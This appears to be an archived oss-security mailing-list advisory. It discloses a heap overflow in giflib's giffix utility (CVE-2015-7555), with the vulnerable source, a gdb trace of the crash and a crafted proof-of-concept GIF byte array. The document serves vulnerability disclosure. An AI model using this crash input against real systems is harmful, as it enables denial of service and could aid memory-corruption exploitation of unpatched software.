X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["5634" "Monday" "21" "December" "2015" "20:56:27" "+0700" "Hans Jerry Illikainen" "hji@dyntopia.com" "<m18u4n7vn8.darpa@darpa.mil>" "186" "[oss-security] giflib: heap overflow in giffix (CVE-2015-7555)" nil nil nil "12" "2015122113:56:27" "[oss-security] giflib: heap overflow in giffix (CVE-2015-7555)" (number mark "U       hji@dyntopia Dec 21  186/5634  " thread-indent "\"[oss-security] giflib: heap overflow in giffix (CVE-2015-7555)\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 26127 invoked by uid 550); 21 Dec 2015 13:55:31 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 26068 invoked from network); 21 Dec 2015 13:55:25 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=dyntopia-com.20150623.gappssmtp.com; s=20150623;
        h=from:to:subject:date:message-id:mime-version:content-type;
        bh=QqbsCsY5e+8tabY1mSjhRAf67JiDPMPlYtSqhDbRtAg=;
        b=Z1w5RcsllTini7ojof4QDjNvZxQUef6W8LuO2Ohcz6vK8RuavoWmWyCehJlRY5mHSu
         FTXaA+SwcIsA/q4lbdx6WdFjbBjniN+/QPXTEldcnD3j/aNDKKZU30qMq/wZ8MG1wyld
         naVczCvu0fQR4ZQ4i+domVOkvQv10M3P3cWwozDNJYKZswQWyepCIq8Bvbpx1ABTyPi1
         zBanM0c51BhgJy1rGXTDlenOpovpUxF1dKzUPGeZfjgitXW3ksLXkU0UnJEyRyu8JsJE
         ZHrUeU4Ao0HoOW9vIuCFTNB9+OSuJN0HVlW1AwNXS3amXIZV3VtRlQNVVZ1Q+f3Mep4O
         GXYg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:from:to:subject:date:message-id:mime-version
         :content-type;
        bh=QqbsCsY5e+8tabY1mSjhRAf67JiDPMPlYtSqhDbRtAg=;
        b=DprJ+e9PZq9MIFrcf+stNvAVG1DjCA7SNdqc76W+DkgGIsTVSvK9EodewFfMJLE5St
         +0mm9IZU5eKV0ZI2qOzuZB2f4m6iDCWg+exaOMLRa/3eXh1+uxHRVqcVZnDfSEJVqrJh
         2sC9skKnNxG/6JCiVyVge2mVd0q8HilqsUBachLv4syVwcIsaO5tTcNFX0NW/DbMUcAd
         fnb/rE9auuZEvw7lRDfQAe/Oy68RLMuSlZM9RPsEAZfxE3QjGG5GJ0Ttk4WfAjzoISH+
         jq2EuLoI0Jl+133/byR7H0C7o1reWsLu6pntGjq/eCKh8YcMRq9o/qFSlwZKLgrfjz4j
         QIVA==
X-Gm-Message-State: ALoCoQm9a/FTtsQ82w3C0nfWTwbZc9HIGkRI1xuh3zZvWRZ+T6IiAOSCajUpynieP3NQgMHnabz2J0+kJwofJrnYNjdr3eDM2A==
X-Received: by 10.28.214.20 with SMTP id n20mr22088213wmg.36.1450706114443;
        Mon, 21 Dec 2015 05:55:14 -0800 (PST)
From: Hans Jerry Illikainen <hji@dyntopia.com>
To: bugtraq@securityfocus.com, fulldisclosure@seclists.org, oss-security@lists.openwall.com
Date: Mon, 21 Dec 2015 20:56:27 +0700
Message-ID: <m18u4n7vn8.darpa@darpa.mil>
MIME-Version: 1.0
Content-Type: text/plain
Subject: [oss-security] giflib: heap overflow in giffix (CVE-2015-7555)


About
=====

giflib[1] is a library for working with GIF images.  It also provides
several command-line utilities.


CVE-2015-7555
=============

A heap overflow may occur in the giffix utility included in giflib-5.1.1
when processing records of the type `IMAGE_DESC_RECORD_TYPE' due to the
allocated size of `LineBuffer' equaling the value of the logical screen
width, `GifFileIn->SWidth', while subsequently having
`GifFileIn->Image.Width' bytes of data written to it.


giflib-5.1.1/util/giffix.c #35..194:
,----
| int main(int argc, char **argv)
| {
|     [...]
|     if ((LineBuffer = (GifRowType) malloc(GifFileIn->SWidth)) == NULL)
|         GIF_EXIT("Failed to allocate memory required, aborted.");
| 
|     /* Scan the content of the GIF file and load the image(s) in: */
|     do {
|         [...]
|         switch (RecordType) {
|             case IMAGE_DESC_RECORD_TYPE:
|                 if (DGifGetImageDesc(GifFileIn) == GIF_ERROR)
|                     QuitGifError(GifFileIn, GifFileOut);
|                 [...]
|                 Width = GifFileIn->Image.Width;
|                 Height = GifFileIn->Image.Height;
|                 [...]
|                 /* Find the darkest color in color map to use as a filler. */
|                 ColorMap = (GifFileIn->Image.ColorMap ? GifFileIn->Image.ColorMap :
|                                                      GifFileIn->SColorMap);
|                 for (i = 0; i < ColorMap->ColorCount; i++) {
|                     j = ((int) ColorMap->Colors[i].Red) * 30 +
|                         ((int) ColorMap->Colors[i].Green) * 59 +
|                         ((int) ColorMap->Colors[i].Blue) * 11;
|                     if (j < ColorIntens) {
|                         ColorIntens = j;
|                         DarkestColor = i;
|                     }
|                 }
| 
|                 /* Load the image, and dump it. */
|                 for (i = 0; i < Height; i++) {
|                     GifQprintf("\b\b\b\b%-4d", i);
|                     if (DGifGetLine(GifFileIn, LineBuffer, Width)
|                         == GIF_ERROR) break;
|                     if (EGifPutLine(GifFileOut, LineBuffer, Width)
|                         == GIF_ERROR) QuitGifError(GifFileIn, GifFileOut);
|                 }
| 
|                 if (i < Height) {
|                     [...]
|                     /* Fill in with the darkest color in color map. */
|                     for (j = 0; j < Width; j++)
|                         LineBuffer[j] = DarkestColor;
|                     for (; i < Height; i++)
|                         if (EGifPutLine(GifFileOut, LineBuffer, Width)
|                             == GIF_ERROR) QuitGifError(GifFileIn, GifFileOut);
|                 }
|                 break;
|             [...]
|         }
|     }
|     while (RecordType != TERMINATE_RECORD_TYPE);
|     [...]
| }
`----

,----
| $ gdb -q --args ./giffix heap.gif
| Reading symbols from ./giffix...done.
| (gdb) b util/giffix.c:94
| Breakpoint 1 at 0x401131: file giffix.c, line 94.
| (gdb) b util/giffix.c:148
| Breakpoint 2 at 0x401449: file giffix.c, line 148.
| (gdb) b util/giffix.c:149
| Breakpoint 3 at 0x401452: file giffix.c, line 149.
| 
| (gdb) commands 3
| Type commands for breakpoint(s) 3, one per line.
| End with a line saying just "end".
| >printf "%p, 0x%02x\n", LineBuffer+j, DarkestColor
| >c
| >end
| 
| (gdb) r
| [...]
| Breakpoint 1, main (argc=2, argv=0x7fffffffe6b8) at giffix.c:94
| 94      if ((LineBuffer = (GifRowType) malloc(GifFileIn->SWidth)) == NULL)
| 
| (gdb) p GifFileIn->SWidth
| $1 = 1
| 
| (gdb) c
| [...]
| Breakpoint 2, main (argc=2, argv=0x7fffffffe6b8) at giffix.c:148
| 148             for (j = 0; j < Width; j++)
| 
| (gdb) p Width
| $2 = 255
| 
| (gdb) c
| Continuing.
| 
| Breakpoint 3, main (argc=2, argv=0x7fffffffe6b8) at giffix.c:149
| 149             LineBuffer[j] = DarkestColor;
| 0x618920, 0x01
| 
| [...]
| 
| Breakpoint 3, main (argc=2, argv=0x7fffffffe6b8) at giffix.c:149
| 149             LineBuffer[j] = DarkestColor;
| 0x618940, 0x01
| 
| [...]
| 
| Breakpoint 3, main (argc=2, argv=0x7fffffffe6b8) at giffix.c:149
| 149             LineBuffer[j] = DarkestColor;
| 0x618a1e, 0x01
| 
| Program received signal SIGSEGV, Segmentation fault.
| 0x00007ffff7bd8658 in GifFreeMapObject (Object=0x101010101010101) at gifalloc.c:80
| 80          (void)free(Object->Colors);
`----


heap.gif:
,----
| unsigned char heap[] = {
|     /* GIF87a */
|     0x47, 0x49, 0x46, 0x38, 0x37, 0x61,
| 
|     /* DGifGetScreenDesc() */
|     0x01, 0x00,         /* GifFile->SWidth */
|     0x01, 0x00,         /* GifFile->SHeight */
|     0x80,               /* ColorCount = 1 << ((this & 0x07) + 1) */
|     0x00,               /* GifFile->SBackGroundColor */
|     0x00,               /* GifFile->AspectByte */
|     0x11, 0x11, 0x11,   /* GifFile->SColorMap->Colors[0] */
|     0x00, 0x00, 0x00,   /* GifFile->SColorMap->Colors[1] */
| 
|     /* DGifGetRecordType() */
|     0x2c,               /* DESCRIPTOR_INTRODUCER */
| 
|     /* DGifGetImageDesc() */
|     0x00, 0x00,         /* GifFile->Image.Left */
|     0x00, 0x00,         /* GifFile->Image.Top */
|     0xff, 0x00,         /* GifFile->Image.Width */
|     0x01, 0x00,         /* GifFile->Image.Height */
|     0x00,               /* BitsPerPixel = (this & 0x07) + 1 */
| 
|     /* DGifSetupDecompress() */
|     0x00,               /* CodeSize */
| 
|     /* end of image data */
|     0x00,
| 
|     /* end of gif */
|     0x3b
| };
`----


Solution
========

No fix exists as of yet.



Footnotes
_________

[1] [http://giflib.sourceforge.net/]


Hans Jerry Illikainen
